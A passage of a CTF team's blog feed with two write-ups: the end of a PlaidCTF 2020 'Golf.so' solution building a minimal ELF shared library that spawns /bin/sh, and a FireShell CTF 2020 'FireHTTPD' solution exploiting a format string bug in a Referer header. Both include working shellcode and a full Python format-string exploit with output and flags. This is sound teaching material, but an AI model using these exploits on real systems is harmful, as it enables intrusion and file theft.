will stop gdb and act like a breakpoint(SIG TRAP) since I wasn’t able to stop at the entry point this helped me a lot on debugging:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">db 0xcc ; SIGTRAP (int 3 instruction)</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>Now going into modifying the <strong>p_filesz</strong> entry to <strong>/bin/sh</strong> string:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">phdr:</span><br><span class="line">  dd    1                          ; p_type   = PT_LOAD</span><br><span class="line">  dd    7                          ; p_flags  = rwx</span><br><span class="line">  dq    0                          ; p_offset</span><br><span class="line">  dq    $$                         ; p_vaddr</span><br><span class="line">  dq    $$                         ; p_paddr</span><br><span class="line">  dq    0x68732f6e69622f           ; p_filesz (now has /bin/sh here)</span><br><span class="line">  dq    0xDEADBEEF                 ; p_memsz</span><br><span class="line">  dq    0x1000                     ; p_align</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Also need to get the offset to this entry, like libc this is also a shared library and a space will be assigned for this lib to be located. Luckily a pointer is saved in the <strong>RAX</strong> register in the begining when the entry code is executed. We can calculated the offset from there by using gdb:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set environment LD_PRELOAD ./a.out</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure><p>The address present in rax:<br><a data-fancybox="gallery" href="https://i.imgur.com/w1kdxFM.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/w1kdxFM.png" alt><br></a><br>So we can verify where the /bin/sh is located by doing:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="variable">$rax</span>-0x62</span><br><span class="line">0x7fff194f205a: <span class="string">"/bin/sh"</span></span><br></pre></td></tr></table></figure><p>After this we can use the lea assembly instruction to get the adress of binsh and save a lot of bytes:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">lea rdi,[rax-0x62]</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>Lets check how much is left:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f bin -o a.out cuted.asm</span><br><span class="line">$ ls -ltah a.out</span><br><span class="line">-rw-r--r-- 1 root root 204 Apr 20 12:46 a.out</span><br></pre></td></tr></table></figure><p>Also we don’t a space reserving for <strong>strtab</strong> so we can make it point to _start instead of creating a label with two <strong>dbs</strong>. </p><p>Updating the script from:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dynsection:</span><br><span class="line">; DT_INIT</span><br><span class="line">  dq    0x0c</span><br><span class="line">  dq    _start</span><br><span class="line">; DT_STRTAB</span><br><span class="line">  dq    0x05</span><br><span class="line">  dq    strtab</span><br><span class="line">; DT_SYMTAB</span><br><span class="line">  dq    0x06</span><br><span class="line">  dq    strtab</span><br><span class="line">dynsz equ $ - dynsection</span><br><span class="line"></span><br><span class="line">strtab:</span><br><span class="line"> db 0</span><br><span class="line"> db 0</span><br><span class="line">strtabsz equ $ - strtab</span><br></pre></td></tr></table></figure><p>To:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dynsection:</span><br><span class="line">; DT_INIT</span><br><span class="line">  dq    0x0c</span><br><span class="line">  dq    _start</span><br><span class="line">; DT_STRTAB</span><br><span class="line">  dq    0x05</span><br><span class="line">  dq    _start</span><br><span class="line">; DT_SYMTAB</span><br><span class="line">  dq    0x06</span><br><span class="line">  dq    _start</span><br><span class="line">dynsz equ $ - dynsection</span><br></pre></td></tr></table></figure><p>Two bytes are now saved:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f bin -o a.out cuted.asm</span><br><span class="line">$ ls -ltah a.out</span><br><span class="line">-rw-r--r-- 1 root root 202 Apr 20 12:49 a.out</span><br></pre></td></tr></table></figure><p>We now need one final tweak for our script to be able to get the final flag… What I did in the end was to overlap the <strong>dynamic section</strong> into the <strong>PT_DYNAMIC</strong> entry, we can control the <strong>p_offset</strong> field without breaking the elf so we can use it as an index of the <strong>dynsection</strong> and make a fake <strong>DT_STRTAB</strong> entry, so the dynamic section will be overlapped saving us something like 0x10 bytes (the old entry DT_STRTAB is removed so we can save 0x10 bytes).</p><p>Due to this action we also need to update the offset in the _start(updated to 0x50).<br>My final payload was:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">BITS 64</span><br><span class="line">org     0</span><br><span class="line">ehdr:</span><br><span class="line">  db    0x7f, &quot;ELF&quot;, 2, 1, 1, 0    ; e_ident</span><br><span class="line">  db    0, 0, 0, 0,  0, 0, 0, 0</span><br><span class="line">  dw    3                          ; e_type    = ET_DYN</span><br><span class="line">  dw    62                         ; e_machine = EM_X86_64</span><br><span class="line">  dd    1                          ; e_version = EV_CURRENT</span><br><span class="line">  dq    _start                     ; e_entry   = _start</span><br><span class="line">  dq    phdr - $$                  ; e_phoff</span><br><span class="line">  dd    phdr - $$                  ; e_shoff (chaged to phdr instead of shdr)</span><br><span class="line">  dq    0                          ; e_flags</span><br><span class="line">  dw    ehdrsize                   ; e_ehsize</span><br><span class="line">  dw    phdrsize                   ; e_phentsize</span><br><span class="line">  dw    2                          ; e_phnum</span><br><span class="line">ehdrsize equ  $ - ehdr</span><br><span class="line"></span><br><span class="line">phdr:</span><br><span class="line">  dd    1                          ; p_type   = PT_LOAD</span><br><span class="line">  dd    7                          ; p_flags  = rwx</span><br><span class="line">  dq    0                          ; p_offset</span><br><span class="line">  dq    $$                         ; p_vaddr</span><br><span class="line">  dq    $$                         ; p_paddr</span><br><span class="line">  dq    0x68732f6e69622f                 ; p_filesz</span><br><span class="line">  dq    0xDEADBEEF                 ; p_memsz</span><br><span class="line">  dq    0x1000                     ; p_align</span><br><span class="line">phdrsize equ  $ - phdr</span><br><span class="line">  dd    2                          ; p_type  = PT_DYNAMIC</span><br><span class="line">  dd    7                          ; p_flags = rwx</span><br><span class="line">dynsection:</span><br><span class="line">; DT_STRTAB</span><br><span class="line">  dq    0x5                        ; p_offset (OVERLAPPED)</span><br><span class="line">  dq    dynsection                 ; p_vaddr</span><br><span class="line">; DT_INIT</span><br><span class="line">  dq    0x0c</span><br><span class="line">  dq    _start</span><br><span class="line">; DT_SYMTAB</span><br><span class="line">  dq    0x06</span><br><span class="line">  dq    _start</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">lea rdi,[rax-0x50]</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">;cdq ; this may be needed locally but in the website accepts anyway without this (1 byte save)</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></p><p>We get a file of 185 bytes :) more than enough to get the final flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f bin -o a.out cuted.asm</span><br><span class="line">$ ls -ltah a.out</span><br><span class="line">-rw-r--r-- 1 root root 185 Apr 20 12:57 a.out</span><br></pre></td></tr></table></figure></p><p>The flag was:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You made it to level 5: record-breaking! You have 9 bytes left to be astounding.</span><br><span class="line">This effort is worthy of 2/2 flags. </span><br><span class="line">PCTF&#123;th0ugh_wE_have_cl1mBed_far_we_MusT_St1ll_c0ntinue_oNward&#125; PCTF&#123;t0_get_a_t1ny_elf_we_5tick_1ts_hand5_in_its_ears_rtmlpntyea&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Golf.so&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;: 104&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 500   &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt; Uplo
      
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="assembly" scheme="https://teamrocketist.github.io/tags/assembly/"/>
    
      <category term="elf" scheme="https://teamrocketist.github.io/tags/elf/"/>
    
      <category term="pctf2020" scheme="https://teamrocketist.github.io/tags/pctf2020/"/>
    
      <category term="nasm" scheme="https://teamrocketist.github.io/tags/nasm/"/>
    
      <category term="preload" scheme="https://teamrocketist.github.io/tags/preload/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] FireShell CTF 2020 - FireHTTPD</title>
    <link href="https://teamrocketist.github.io/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/"/>
    <id>https://teamrocketist.github.io/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/</id>
    <published>2020-03-23T00:45:41.000Z</published>
    <updated>2022-08-23T01:20:11.161Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>FireHTTPD</p></blockquote><blockquote><p><strong>Solves</strong>: 23</p><p><strong>Points</strong>: 492   </p><p><strong>Description</strong>:<br>UPDATE: Server is running in /home/ctf/firehttpd Flag is on /home/ctf/flag</p><p><a href="http://142.93.113.55:31084/" target="_blank" rel="noopener">http://142.93.113.55:31084/</a></p><p><a href="https://mega.nz/#!XmoXgBRb!UoiUeeKurXrECUQpYd9_JOdk-WCXJ-wVVM3xJQg2vEQ" target="_blank" rel="noopener">firehttpd</a><br>a6e05cc456b289505a6c5e36f0c04ed5</p><p><a href="https://mega.nz/#!eygFyJBR!FZLD4mY_6q912Mynkxushu1QcrFYCxsxCFoQiLq_77w" target="_blank" rel="noopener">libc.so.6</a><br>2fb0d6800d4d79ffdc7a388d7fe6aea0</p><p><strong>Author</strong>: Alisson Bezerra</p></blockquote><h3 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP Server"></a>HTTP Server</h3><p>First of all thanks to <strong>Alisson</strong> for creating a challenge that is close to a real app, something that is close to reality as we say in Portugal a challenge with <strong>“head, torso and limbs”</strong>.</p><p>Back to the challenge <strong>firehttpd</strong> is a http server, after looking at the code in the function <strong>serve_file</strong> we can find a format string vulnerability in <strong>sprintf</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">serve_file</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  v5 = <span class="built_in">strstr</span>(a2, <span class="string">".."</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v3 &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">"\n"</span>, &amp;s1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = get_line(a1, &amp;s1, <span class="number">1024L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1, <span class="string">"Referer: "</span>, <span class="number">9u</span>LL) )</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;s, &amp;s1); <span class="comment">// format string vulnerability</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( access(a2, <span class="number">0</span>) == <span class="number">-1</span> || v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    not_found(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    headers(a1, a2, &amp;s);</span><br><span class="line">    stream = fopen(a2, <span class="string">"r"</span>);</span><br><span class="line">    cat(a1, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Also there is a <strong>..</strong> filter to prevent file transversal, <strong>strstr</strong> will return a pointer if finds a <strong>“..”</strong> in the string and if that happens we will fall in to the <strong>not_found</strong> thus not reading the flag file. </p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>The <strong>easiest</strong> solution was to actually use format string to clear <strong>a5</strong> variable with this you could file transversal by <strong>bypassing</strong> the filter. But during the ctf I didn’t pay much attention to the “..” filter and only focused on the string containing the file path which made the challenge a <strong>bit</strong> harder, because we kind of need to <strong>clear</strong> the path present there and also write <strong>4 characters</strong>(“flag”) to open the file.</p><p>I will explain my solution, the first thing is to <strong>leak</strong> a stack address because we want to modify the value of a <strong>local variable</strong> and as we know <strong>local</strong> variables are <strong>stored</strong> in the <strong>stack</strong>, we can try to find a pointer to the path in the stack by using the <strong>telescope</strong> command of <strong>pwndbg</strong>:</p><p>First we set a breakpoint:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; pie</span><br><span class="line">Calculated VA from /ctf/pwn/firehttpd/firehttpd = 0x555555554000</span><br><span class="line">pwndbg&gt; b *0x555555554000+0x2011</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure></p><p>The moment that it hit the breakpoint:<br><a data-fancybox="gallery" href="https://i.imgur.com/EKeTC9D.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/EKeTC9D.png" alt><br></a><br>Then we can use telescope command to check the values in the stack:<br><a data-fancybox="gallery" href="https://i.imgur.com/FfCZIMj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/FfCZIMj.png" alt><br></a><br>As you can see above the pointer to the file path is at the 5th position so lets leak it with format string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formats</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> requests.get(url,headers=&#123;</span><br><span class="line">                <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>, </span><br><span class="line">                <span class="string">'Server'</span>: <span class="string">'FireHTTPD/0.0.1'</span>, </span><br><span class="line">                <span class="string">'Referer'</span>:s&#125;)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            print(<span class="string">'error'</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">r=formats(<span class="string">'%5$lx'</span>)</span><br><span class="line">FILENAME = int(r.headers[<span class="string">'Referer'</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>Now we need to write into that address, since the server is always running and doesn’t restart we can split the exploit in different request. </p><p>We need to write <strong>4 bytes</strong> and <strong>clear</strong> the previous path, we can use <code>%ln</code> to clear the path with <strong>nulls</strong>, the <code>l</code> length modifier means <strong>long</strong> which goes up to 8 bytes which is what we really want to clear the entire path. </p><p>Next I tried to use two <code>%hn</code> like we usually do in <strong>printf</strong> challenges but for some reason I was getting some memory errors, maybe because the number of the printed characters required was too high. </p><p>If you want to know more about length modifiers you can read the <strong>man page</strong> of <strong>printf</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ man <span class="built_in">printf</span>\(3\)</span><br></pre></td></tr></table></figure></p><p>Two <code>%hn</code> didn’t work so to write four characters we need to do four <code>%hhn</code> each one will write the maximum of a <code>char</code> 1 byte:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'%19$ln'</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%19$hhn'</span>.format(<span class="number">0x66</span><span class="number">-9</span>)    <span class="comment"># f 0x66</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%20$hhn'</span>.format(<span class="number">0x106</span>)     <span class="comment"># l 0x6c</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%21$hhn'</span>.format(<span class="number">0x94</span>+<span class="number">0x61</span>) <span class="comment"># a 0x61</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%22$hhn'</span>.format(<span class="number">1</span>+<span class="number">0x5</span>)     <span class="comment"># g 0x67</span></span><br><span class="line">payload = payload.encode() <span class="comment"># python3 shenanigans</span></span><br><span class="line">payload += <span class="string">b'_'</span>* (<span class="number">56</span>-len(payload)<span class="number">-1</span>)</span><br><span class="line">payload += p64(FILENAME)</span><br><span class="line">payload += p64(FILENAME+<span class="number">1</span>)</span><br><span class="line">payload += p64(FILENAME+<span class="number">2</span>)</span><br><span class="line">payload += p64(FILENAME+<span class="number">3</span>)</span><br><span class="line">r=formats(payload) <span class="comment"># r.text bugs out and doesn't print the body</span></span><br></pre></td></tr></table></figure><p>Yes the <strong>offsets</strong> above are a <strong>mess</strong> but hey it works! (those could be calculated via debugging and do the writes one by one), also since I was using <strong>python requests</strong> to communicate with the http server for some reason the flag didn’t come out in the <strong>body</strong> (r.text). </p><p>We could <strong>solve</strong> this problem by just communicate with the server directly via <strong>tcp</strong> and construct manually the <strong>HTTP payload</strong>, another idea would be to capture the traffic using wireshark or you could do it like I did by doing an <strong>extra request</strong> to print the value where it was <strong>saved</strong> in the stack by using <code>%s</code> luckily the string was <strong>still</strong> saved in the stack in the <strong>next request</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KK = FILENAME<span class="number">-0xf30</span></span><br><span class="line">payload = <span class="string">b'__%13$s'</span> <span class="comment"># Getting the flag in the next request</span></span><br><span class="line">payload += p64(KK)</span><br><span class="line">r=formats(payload)</span><br><span class="line">print(r.headers)</span><br></pre></td></tr></table></figure><p>The full exploit:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#host, port = "127.0.0.1", "1337"</span></span><br><span class="line">filename = <span class="string">"./firehttpd"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span><span class="params">(val, nbits)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (val + (<span class="number">1</span> &lt;&lt; nbits)) % (<span class="number">1</span> &lt;&lt; nbits)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    url = <span class="string">'http://127.0.0.1:1337/index.html'</span></span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    url = <span class="string">'http://142.93.113.55:31084/'</span></span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>] <span class="comment"># remove this if you don't use tmux</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formats</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> requests.get(url,headers=&#123;</span><br><span class="line">                <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>, </span><br><span class="line">                <span class="string">'Server'</span>: <span class="string">'FireHTTPD/0.0.1'</span>, </span><br><span class="line">                <span class="string">'Referer'</span>:s&#125;)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            print(<span class="string">'error'</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">r=formats(<span class="string">'%5$lx'</span>)</span><br><span class="line">FILENAME = int(r.headers[<span class="string">'Referer'</span>],<span class="number">16</span>)</span><br><span class="line">FLAG = <span class="number">0x67616c66</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%19$ln'</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%19$hhn'</span>.format(<span class="number">0x66</span><span class="number">-9</span>)    <span class="comment"># f 0x66</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%20$hhn'</span>.format(<span class="number">0x106</span>)     <span class="comment"># l 0x6c</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%21$hhn'</span>.format(<span class="number">0x94</span>+<span class="number">0x61</span>) <span class="comment"># a 0x61</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%22$hhn'</span>.format(<span class="number">1</span>+<span class="number">0x5</span>)     <span class="comment"># g 0x67</span></span><br><span class="line">payload = payload.encode() <span class="comment"># python3 shenanigans</span></span><br><span class="line">payload += <span class="string">b'_'</span>* (<span class="number">56</span>-len(payload)<span class="number">-1</span>)</span><br><span class="line">payload += p64(FILENAME)</span><br><span class="line">payload += p64(FILENAME+<span class="number">1</span>)</span><br><span class="line">payload += p64(FILENAME+<span class="number">2</span>)</span><br><span class="line">payload += p64(FILENAME+<span class="number">3</span>)</span><br><span class="line">r=formats(payload) <span class="comment"># r.text bugs out and doesn't print the body</span></span><br><span class="line"></span><br><span class="line">KK = FILENAME<span class="number">-0xf30</span></span><br><span class="line">payload = <span class="string">b'__%13$s'</span> <span class="comment"># Getting the flag in the next request</span></span><br><span class="line">payload += p64(KK)</span><br><span class="line">r=formats(payload)</span><br><span class="line">print(r.headers)</span><br></pre></td></tr></table></figure></p><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python3 firehttpd.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/firehttpd/firehttpd'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/firehttpd/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">&#123;<span class="string">'Referer'</span>: <span class="string">'__F#&#123;0h_th0s3_f0rm4t_str1ngs&#125;'</span>, <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>, <span class="string">'Server'</span>: <span class="string">'FireHTTPD/0.0.1'</span>&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;FireHTTPD&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Solves&lt;/strong&gt;: 23&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 492   &lt;/p&gt;
&lt;p&gt;&lt;stron
      
    
    </summary>
    
